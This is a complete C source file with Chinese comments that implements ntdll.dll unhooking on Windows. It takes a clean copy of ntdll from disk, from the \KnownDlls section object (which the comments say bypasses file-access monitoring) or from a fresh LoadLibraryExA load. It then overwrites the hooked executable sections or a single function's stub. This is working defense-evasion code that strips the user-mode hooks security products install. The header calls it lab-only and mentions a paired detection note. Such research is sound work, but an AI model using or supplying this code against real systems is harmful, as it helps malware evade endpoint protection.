// ntdll 去 hook 完整实现：三种干净副本来源 + 单函数恢复 + 覆盖前后哈希对账（argv 切换）
//
// 用法：unhook.exe [mode] [函数名]
//   mode 0（默认）：磁盘文件 SEC_IMAGE 映射（device 路径）→ 全量恢复所有可执行段
//   mode 1        ：\KnownDlls\ntdll.dll 段对象（NtOpenSection+NtMapViewOfSection）——
//                   不走磁盘文件 I/O，绕文件访问监控
//   mode 2        ：LoadLibraryExA(..., DONT_RESOLVE_DLL_REFERENCES) 新副本 → 从新映射恢复
//   mode 3        ：单函数恢复——[函数名] 必填，只覆盖该函数头部 32 字节
//                   （Nt* syscall stub 实测 0x12-0x18 字节；超出 32 字节的函数按 32B 记，
//                   不覆盖完整函数体的场景如实标注）
// 构建：x86_64-w64-mingw32-gcc -mwindows -o unhook.exe unhook.c
// 检测侧配对见 NOTES.md；仅本地实验环境使用
#include <windows.h>
#include <stdio.h>

/* FNV-1a 64（覆盖前后哈希对账用） */
static ULONG64 fnv1a(const BYTE* p, SIZE_T n) {
    ULONG64 h = 1469598103934665603ULL;
    for (SIZE_T i = 0; i < n; i++) { h ^= p[i]; h *= 1099511628211ULL; }
    return h;
}

/* 覆盖一个可执行段：clean 视图 → hooked 模块（按 RVA 对齐；VirtualSize 覆盖）
 * SEC_IMAGE / 段对象视图均按映像布局（节在 VirtualAddress），故两视图同偏移互拷成立 */
static void restore_region(BYTE* hooked, BYTE* clean, DWORD rva, DWORD size, const char* name) {
    DWORD old;
    VirtualProtect(hooked + rva, size, PAGE_EXECUTE_READWRITE, &old);
    ULONG64 before = fnv1a(hooked + rva, size);
    memcpy(hooked + rva, clean + rva, size);
    ULONG64 after = fnv1a(hooked + rva, size);
    VirtualProtect(hooked + rva, size, old, &old);
    printf("[+] %-8s 段已恢复（%lu 字节）hash %016llX → %016llX%s\n",
           name, size, before, after, before == after ? "（恢复前后一致=未被 hook）" : "");
}

/* 干净副本来源一：磁盘文件 SEC_IMAGE 映射（device 路径） */
static BYTE* clean_via_file(void) {
    HANDLE f = CreateFileA("\\\\.\\C:\\Windows\\System32\\ntdll.dll", GENERIC_READ,
        FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (f == INVALID_HANDLE_VALUE) return NULL;
    HANDLE m = CreateFileMappingA(f, NULL, SEC_IMAGE | PAGE_READONLY, 0, 0, NULL);
    CloseHandle(f);
    if (!m) return NULL;
    BYTE* v = (BYTE*)MapViewOfFile(m, FILE_MAP_READ, 0, 0, 0);
    return v; /* 句柄泄漏于 demo 可接受（进程即实验体）；真实形态 CloseHandle 收尾 */
}

/* 干净副本来源二：\KnownDlls\ntdll.dll 段对象（零磁盘 I/O） */
typedef struct { WORD len, maxlen; PWCHAR buf; } USTR;
typedef LONG (NTAPI* pNtOpenSection)(HANDLE*, DWORD, void*);
typedef LONG (NTAPI* pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG64, SIZE_T, void*,
                                          SIZE_T*, DWORD, DWORD, DWORD);
static BYTE* clean_via_known_dlls(void) {
    HMODULE nt = GetModuleHandleA("ntdll.dll");
    pNtOpenSection      NtOpenSection      = (pNtOpenSection)GetProcAddress(nt, "NtOpenSection");
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(nt, "NtMapViewOfSection");
    if (!NtOpenSection || !NtMapViewOfSection) return NULL;

    static WCHAR name[] = L"\\KnownDlls\\ntdll.dll";
    USTR us = { sizeof(name) - sizeof(WCHAR), sizeof(name), name };
    HANDLE sec = NULL;
    /* OBJ_CASE_INSENSITIVE=0x40；SECTION_MAP_READ=0x4 */
    if (NtOpenSection(&sec, 0x4, &us) != 0 || !sec) return NULL;

    BYTE* base = NULL; SIZE_T vsz = 0;
    /* ViewShare=1（SEC_IMAGE 必需的映射类型），保护 PAGE_READONLY */
    if (NtMapViewOfSection(sec, GetCurrentProcess(), (PVOID*)&base, 0, 0, NULL,
                           &vsz, 1, 0, PAGE_READONLY) != 0 || !base) return NULL;
    return base;
}

/* 干净副本来源三：LoadLibraryExA 新副本（DONT_RESOLVE_DLL_REFERENCES=0x1，
 * 加载为数据映像不跑初始化，映射是另一份干净基址） */
static BYTE* clean_via_fresh_load(void) {
    HMODULE m = LoadLibraryExA("ntdll.dll", NULL, 0x1);
    return (BYTE*)m;
}

int main(int argc, char** argv) {
    int mode = (argc > 1) ? atoi(argv[1]) : 0;
    const char* fname = (argc > 2) ? argv[2] : NULL;

    BYTE* hooked = (BYTE*)GetModuleHandleA("ntdll.dll");
    BYTE* clean = NULL;
    switch (mode) {
    case 0: clean = clean_via_file();          break;
    case 1: clean = clean_via_known_dlls();    break;
    case 2: clean = clean_via_fresh_load();    break;
    case 3: clean = clean_via_file();          break;
    default: printf("[-] 未知 mode %d（0/1/2/3）\n", mode); return 3;
    }
    if (!clean) { printf("[-] 干净副本获取失败（mode %d）\n", mode); return 1; }

    /* mode 3：单函数恢复（只覆盖目标函数头 32 字节） */
    if (mode == 3) {
        if (!fname) { printf("[-] mode 3 需要函数名参数\n"); return 2; }
        FARPROC fn = GetProcAddress((HMODULE)hooked, fname);
        if (!fn) { printf("[-] %s 未找到\n", fname); return 2; }
        DWORD rva = (DWORD)((BYTE*)fn - hooked);
        restore_region(hooked, clean, rva, 32, fname);
        return 0;
    }

    /* 全量：遍历干净副本节表，恢复所有可执行段 */
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)clean;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(clean + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)
            restore_region(hooked, clean, sec->VirtualAddress, sec->Misc.VirtualSize,
                           (const char*)sec->Name);
    }
    return 0;
}
